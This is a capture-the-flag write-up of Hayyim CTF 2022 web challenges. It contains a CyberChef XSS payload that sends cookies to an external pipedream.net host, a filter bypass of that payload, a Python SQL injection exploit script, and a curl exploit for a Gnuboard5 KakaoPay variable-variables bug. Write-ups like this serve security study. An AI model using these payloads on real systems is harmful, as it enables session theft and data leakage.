<img src="https://github.com/P0cas/Storage/blob/main/write%20up/ctf/2022/Hayyim%20CTF%202022/hayyim%20CTF%202022.png?raw=true" style="width: 100%;
        max-width: 100%;
        height: auto;">

This weekend, Hayyim Security hosted the CTF, and I participated in it for about 3 ~ 4 hours and I was solved Cyberchef, Not E and Cyber Headchef challenges.

---
## (Web) Cyberchef [100 pts]

The Cyberchef is a simple XSS challenge. Cyberchef service is open source that provides encryption/decryption service and has 1-Day vulnerability.

```plaintext
http://cyberchef:8000/#recipe=Scatter_chart('Line%20feed','Space',false,'','','red"><script>fetch("https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/".concat(document.cookie))</script>',100,false)&input=MTAwLCAxMDA
```
1-Day issues can be found [here](https://github.com/gchq/CyberChef/issues/1265). And I was able to get the flag by sending the above PoC to the admin bot.

```plaintext
FLAG : hsctf{fa98fe3d32b4302aff1c322c925238a9d935b636f265cbfdd798391ca9c5a905}
```

---
## (Web) Not E [158 pts]

The Not E challenge is a SQL Injection issue. In this problem, we are using our own binding function, not the Prepared Binding function provided by sqlite of Node, and this function has a vulnerability.

```javascript
const sqlite3 = require('sqlite3');
const flag = require('fs').readFileSync('/flag').toString();

class Database {
  constructor(filename) {
    this.db = new sqlite3.Database(filename);

    this.db.serialize(() => {
      this.run('create table members (username text, password text)');
      this.run('create table posts (id text, title text, content text, owner text)');
      this.run('create table flag (flag text)');
      this.run('insert into flag values (?)', [ flag ]);
    });
  }
// (skip..)
```
I could see the FLAG were stored in a table called `flag`. So, in order to solve this challenge, we have to use SQL Injection to leak the flags contained in the table. Otherwise, read the /flag file using RCE, but this is not possible. Therefore, we should focus on SQL Injection.


- /login
- /logout
- /new
- /view/:noteId

First, the functions provided by the Note service are login, post writing, and post reading functions.

```javascript
const checkParam = (param) => {
  if (typeof param !== 'string' || param.length === 0 || param.length > 256) {
    return false;
  }
  return true;
};
```
And all input values are type checked by checkParam function.

```javascript
  #formatQuery(sql, params = []) {
    for (const param of params) {
      if (typeof param === 'number') {
        sql = sql.replace('?', param);
      } else if (typeof param === 'string') {
        sql = sql.replace('?', JSON.stringify(param.replace(/["\\]/g, '')));
      } else {
        sql = sql.replace('?', ""); // unreachable
      }
    }
    return sql;
  };
```
In addition, all sql queries are using custom binding function. I thought there was a weakness here. The reason is that the server uses the custom binding function even though the node's sqlite provides the binding function.

In the formatQuery() function, after using the JSON.stringify() method to convert the input value into a string, you can see that the generated value and '?' are replaced.

```javascript
JSON.stringify('Hello Pocas')
'"Hello Pocas"'
JSON.stringify("Hello Pocas")
'"Hello Pocas"'
```
When JSON.stringify() is used, double quotation marks(") are added to both ends of the string as shown above.

```sql
insert into posts values ('noteid', ""?"", ?, ?)
```
If you use the writing function and pass a question mark character as the value of title, the query is created as above. And when you check the value of the second argument of the query, you can see that a question mark is created after the string (""), and the value of content is replaced with the question mark randomly generated. so you can escape the double quarter by this. 

```python
import requests
import uuid
import re

url = "http://1.230.253.91:1000"
username = uuid.uuid4()

print("[+] Exploit")
print(f"[+] Username  : {username}")
sess = requests.Session()
# Login/Register
account = {"username":username, "password":"pocas"}
res = sess.post(url + '/login', data=account)

# Leak the flag
poc = {"title":"?", "content":",(select flag from flag),?)--"}
res = sess.post(url + '/new', data=poc)

# Parse the flag path
flag_path = re.search('\/view\/[0-9a-z]*', sess.get(url).text).group()
print(f"[+] Flag Path : {flag_path}")

# Read the flag
flag = re.search('hsctf\{[0-9a-z]*\}', sess.get(url + flag_path).text).group()
print(f"[+] Real FLAG : {flag}")
```
Finally I wrote the exploit code as above

```sh
 ⚡ root@pocas  ~  python3 poc.py
[+] Exploit
[+] Username  : 116588a5-5cb1-46e8-917e-5f7ea12408bf
[+] Flag Path : /view/7fc3144da56dd8c9dbdfded1b3f35c44
[+] Real FLAG : hsctf{038d083216a920c589917b898ff41fd9611956b711035b30766ffaf2ae7f75f2}
 ⚡ root@pocas  ~ 
```


```
FLAG : hsctf{038d083216a920c589917b898ff41fd9611956b711035b30766ffaf2ae7f75f2}
```

---
## (Web) Cyber Headchef [390 pts]

The Cyber Headchef challenge is Cyberchef's v2 and this is a 0-Day Challenge. (This is an unintended solution)

```javascript
app.post('/report', (req, res) => {
  const url = req.body.url;

  if (!checkUrl(url)) {
    res.redirect('/?message=invalid argument');
  } else if (unescape(url).indexOf('chart') !== -1) {
    res.redirect('/?message=sorry, headchef doesn\'t like chart!');
  } else if (!checkRateLimit(req.ip)) {
    res.redirect(`/?message=rate limited`);
  } else {
    visitUrl(url)
      .then(() => res.redirect('/?message=reported'));
  }
});
```
This is filtering the characters called chart among the function names used in the 1-Day exploit.  But this can be bypassed using null byte injection

```plaintext
http://cyberchef:8000/#recipe=Scatter_ch%00art('Line%20feed','Space',false,'','','red"><script>fetch("https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/".concat(document.cookie))</script>',100,false)&input=MTAwLCAxMDA
```
So I was able to get the flag by sending the above PoC to the admin bot.

```plaintext
FLAG : hsctf{be9e5b8bce203e203597dca3d67e0f7a38e359a9ab7799988e888be073c78da0}
```

---
## (Web/Not Solve) Gnuboard [498 pts]

The Gnuboard challenge is to solve it using 0-Day. This challenge was so difficult that I couldn't solve it while the competition was in progress, and after the competition I asked [as3617](https://blog.ssrf.kr/).

```docker
FROM ubuntu:20.04
ARG DEBIAN_FRONTEND=noninteractive

RUN apt-get update
RUN apt-get install -y wget curl apache2 git php-gd php-mysql php

RUN git clone https://github.com/gnuboard/gnuboard5 /tmp/gnuboard
RUN cp -r /tmp/gnuboard/* /var/www/html
RUN sed -i 's/AllowOverride None/AllowOverride All/g' /etc/apache2/apache2.conf

WORKDIR /var/www/html

RUN mkdir data
RUN chmod 777 data
RUN rm -rf index.html /tmp/gnuboard

RUN echo '$flag = "hsctf{flag_will_be_here}";' >> /var/www/html/common.php

ADD entrypoint.sh /
CMD /entrypoint.sh
```
I could see in the docker file that the latest version of Gnuboard 5 was being used, and the flag was defined as a variable called $flag in `common.php`. So, after a long time, I started to analyze GnuBoard and found the SQL Injection vector, but it might not work well, and even if SQL Injection occurs, I don't think I can do anything using it. So I had to give up.


```plaintext
Hint : Gnuboard, It really has too many functions to be a just "board". It seems the way how they implement the payment is meh.
```
Hayyim Security provided a hint because there was no solver for the challenge. Hint mentioned the payment part.

```php
include_once('./_common.php');

// (Skip..)

try {

    //#############################
    // 인증결과 파라미터 일괄 수신
    //#############################
    //      $var = $_REQUEST["data"];

    //#####################
    // 인증이 성공일 경우만
    //#####################
    if (isset($_REQUEST['resultCode']) && strcmp('0000', $_REQUEST['resultCode']) == 0) {

        //############################################
        // 1.전문 필드 값 설정(***가맹점 개발수정***)
        //############################################

        $charset = 'UTF-8';        // 리턴형식[UTF-8,EUC-KR](가맹점 수정후 고정)

        $format = 'JSON';        // 리턴형식[XML,JSON,NVP](가맹점 수정후 고정)
        // 추가적 noti가 필요한 경우(필수아님, 공백일 경우 미발송, 승인은 성공시, 실패시 모두 Noti발송됨) 미사용
        //String notiUrl    = "";

        $authToken = $_REQUEST['authToken'];   // 취소 요청 tid에 따라서 유동적(가맹점 수정후 고정)

        $authUrl = $_REQUEST['authUrl'];    // 승인요청 API url(수신 받은 값으로 설정, 임의 세팅 금지)

        $netCancel = $_REQUEST['netCancelUrl'];   // 망취소 API url(수신 받은f값으로 설정, 임의 세팅 금지)

        ///$mKey = $util->makeHash(signKey, "sha256"); // 가맹점 확인을 위한 signKey를 해시값으로 변경 (SHA-256방식 사용)
        $mKey = hash("sha256", $signKey);

        //#####################
        // 2.signature 생성
        //#####################
        $signParam['authToken'] = $authToken;  // 필수
        $signParam['timestamp'] = $timestamp;  // 필수
        // signature 데이터 생성 (모듈에서 자동으로 signParam을 알파벳 순으로 정렬후 NVP 방식으로 나열해 hash)
        $signature = $util->makeSignature($signParam);


        //#####################
        // 3.API 요청 전문 생성
        //#####################
        $authMap['mid'] = $default['de_kakaopay_mid'];   // 필수
        $authMap['authToken'] = $authToken; // 필수
        $authMap['signature'] = $signature; // 필수
        $authMap['timestamp'] = $timestamp; // 필수
        $authMap['charset'] = $charset;  // default=UTF-8
        $authMap['format'] = $format;  // default=XML
        //if(null != notiUrl && notiUrl.length() > 0){
        //  authMap.put("notiUrl"       ,notiUrl);
        //}


        try {

            $httpUtil = new HttpClient();

            //#####################
            // 4.API 통신 시작
            //#####################

            $authResultString = "";
            if ($httpUtil->processHTTP($authUrl, $authMap)) {
                $authResultString = $httpUtil->body;
            } else {
                echo "Http Connect Error\n";
                echo $httpUtil->errormsg;

                throw new Exception("Http Connect Error");
            }

            //############################################################
            //5.API 통신결과 처리(***가맹점 개발수정***)
            //############################################################

            $resultMap = json_decode($authResultString, true);

            $tid = $resultMap['tid'];
            $oid = preg_replace('/[^A-Za-z0-9\-_]/', '', $resultMap['MOID']);

            /*************************  결제보안 추가 2016-05-18 START ****************************/
            $secureMap['mid']       = $default['de_kakaopay_mid'];                         //mid
            $secureMap['tstamp']    = $timestamp;                   //timestemp
            $secureMap['MOID']      = $resultMap['MOID'];           //MOID
            $secureMap['TotPrice']  = $resultMap['TotPrice'];       //TotPrice

            // signature 데이터 생성
            $secureSignature = $util->makeSignatureAuth($secureMap);
            /*************************  결제보안 추가 2016-05-18 END ****************************/

            $sql = " select * from {$g5['g5_shop_order_data_table']} where od_id = '$oid' ";
            $row = sql_fetch($sql);

            $data = isset($row['dt_data']) ? unserialize(base64_decode($row['dt_data'])) : array();

            if(isset($data['pp_id']) && $data['pp_id']) {
                $page_return_url  = G5_SHOP_URL.'/personalpayform.php?pp_id='.$data['pp_id'];
            } else {
                $page_return_url  = G5_SHOP_URL.'/orderform.php';
                if(get_session('ss_direct'))
                    $page_return_url .= '?sw_direct=1';
            }

            if ((strcmp('0000', $resultMap['resultCode']) == 0) && (strcmp($secureSignature, $resultMap['authSignature']) == 0) ) { //결제보안 추가 2016-05-18
                /*                         * ***************************************************************************
                 * 여기에 가맹점 내부 DB에 결제 결과를 반영하는 관련 프로그램 코드를 구현한다.
                  [중요!] 승인내용에 이상이 없음을 확인한 뒤 가맹점 DB에 해당건이 정상처리 되었음을 반영함
                  처리중 에러 발생시 망취소를 한다.
                 * **************************************************************************** */

                //최종결제요청 결과 성공 DB처리
                $tno        = $resultMap['tid'];
                $amount     = $resultMap['TotPrice'];
                $app_time   = $resultMap['applDate'].$resultMap['applTime'];
                $pay_method = $resultMap['payMethod'];
                $pay_type   = $PAY_METHOD[$pay_method];
                $depositor  = isset($resultMap['VACT_InputName']) ? $resultMap['VACT_InputName'] : '';
                $commid     = '';
                $mobile_no  = isset($resultMap['HPP_Num']) ? $resultMap['HPP_Num'] : '';
                $app_no     = $resultMap['applNum'];
                $card_name  = $CARD_CODE[$resultMap['CARD_Code']];
                switch($pay_type) {
                    case '계좌이체':
                        $bank_name = $BANK_CODE[$resultMap['ACCT_BankCode']];
                        if ($default['de_escrow_use'] == 1)
                            $escw_yn         = 'Y';
                        break;
                    case '가상계좌':
                        $bankname  = $BANK_CODE[$resultMap['VACT_BankCode']];
                        $account   = $resultMap['VACT_Num'].' '.$resultMap['VACT_Name'];
                        $app_no    = $resultMap['VACT_Num'];
                        if ($default['de_escrow_use'] == 1)
                            $escw_yn         = 'Y';
                        break;
                    default:
                        break;
                }

                $inicis_pay_result = true;

            } else {
                $s = '(오류코드:'.$resultMap['resultCode'].') '.$resultMap['resultMsg'];
                alert($s, $page_return_url);
            }

            // 수신결과를 파싱후 resultCode가 "0000"이면 승인성공 이외 실패
            // 가맹점에서 스스로 파싱후 내부 DB 처리 후 화면에 결과 표시
            // payViewType을 popup으로 해서 결제를 하셨을 경우
            // 내부처리후 스크립트를 이용해 opener의 화면 전환처리를 하세요
            //throw new Exception("강제 Exception");
        } catch (Exception $e) {
            //    $s = $e->getMessage() . ' (오류코드:' . $e->getCode() . ')';
            //####################################
            // 실패시 처리(***가맹점 개발수정***)
            //####################################
            //---- db 저장 실패시 등 예외처리----//
            $s = $e->getMessage() . ' (오류코드:' . $e->getCode() . ')';
            echo $s;

            //#####################
            // 망취소 API
            //#####################

            $netcancelResultString = ""; // 망취소 요청 API url(고정, 임의 세팅 금지)
            if ($httpUtil->processHTTP($netCancel, $authMap)) {
                $netcancelResultString = $httpUtil->body;
            } else {
                echo "Http Connect Error\n";
                echo $httpUtil->errormsg;

                throw new Exception("Http Connect Error");
            }

            echo "## 망취소 API 결과 ##";

            $netcancelResultString = str_replace("<", "&lt;", $$netcancelResultString);
            $netcancelResultString = str_replace(">", "&gt;", $$netcancelResultString);

            echo "<pre>", $netcancelResultString . "</pre>";
            // 취소 결과 확인
        }
    }
// https://github.com/gnuboard/gnuboard5/blob/master/shop/kakaopay/pc_pay_result.php
```
The above code is the Kakao Pay payment logic. The important thing here is to use the try/catch statement, and the vulnerability occurs in the catch statement.

```php
            if ($httpUtil->processHTTP($netCancel, $authMap)) {
                $netcancelResultString = $httpUtil->body;
            } else {
                echo "Http Connect Error\n";
                echo $httpUtil->errormsg;

                throw new Exception("Http Connect Error");
            }

            echo "## 망취소 API 결과 ##";

            $netcancelResultString = str_replace("<", "&lt;", $$netcancelResultString);
            $netcancelResultString = str_replace(">", "&gt;", $$netcancelResultString);

            echo "<pre>", $netcancelResultString . "</pre>";
// https://github.com/gnuboard/gnuboard5/blob/master/shop/kakaopay/pc_pay_result.php#L175L189
```
The code above is executed when payment fails. Send a request to $netCancle using the $httpUtil->processHTTP() function, and store the return value in the $netcancelResultString variable. After that, I could see that variable variables were used twice in total by using the str_replace() function.

```
0. HTTP Request
$netcancelResultString = authToken

1. First str_replace()
$$netcancelResultString := $authToken = flag
$netcancelResultString = flag

2. Second str_replace()
$$netcancelResultString := $flag
$netcancelResultString = hsctf{~~~~}
```
If the string called authToken is included in the value of $netcancelResultString after http request as above When the str_replace() function is called for the first time, the string called flag will be saved as the value of the $netcancelResultString variable by variable variables. ($authToken is flag)

The second time the str_replace() function is called, the value of the $$netcancelResultString variable is the same as $flag, so the flag saved in common.php will be saved in the $netcancelResultString variable.

```php
        $authUrl = $_REQUEST['authUrl'];    // 승인요청 API url(수신 받은 값으로 설정, 임의 세팅 금지)
        // https://github.com/gnuboard/gnuboard5/blob/master/shop/kakaopay/pc_pay_result.php#L33
```
In order to generate an error, pass an incorrect URL as the value of `authUrl`.

```plaintext
 ⚡ root@pocas  ~  curl http://1.230.253.91:5000/shop/kakaopay/pc_pay_result.php\?authUrl\=http://\&netCancelUrl\=https://6668197e65f7e3f7f5b45ff55a909ddd.m.pipedream.net/\&authToken\=flag\&resultCode\=0000
Http Connect Error
Connection failed (0) Failed to parse address ""Http Connect Error (오류코드:0)## 망취소 API 결과 ##<pre>hsctf{799c12711fd9d697a00ae3e6329a7979cc648d7cdae0fbb3d62f23a1f7c7f544}</pre><br><br>결제 에러가 일어났습니다. 에러 이유는 위와 같습니
다.
```
Finally I got the flags by sending a request like above. 

```plaintext
FLAG : hsctf{799c12711fd9d697a00ae3e6329a7979cc648d7cdae0fbb3d62f23a1f7c7f544}
```

---
Thanks to [Hayyim Security](http://www.hayyimsecurity.com/) for making these fun challenges. It's been a long time since I studied a lot.

---
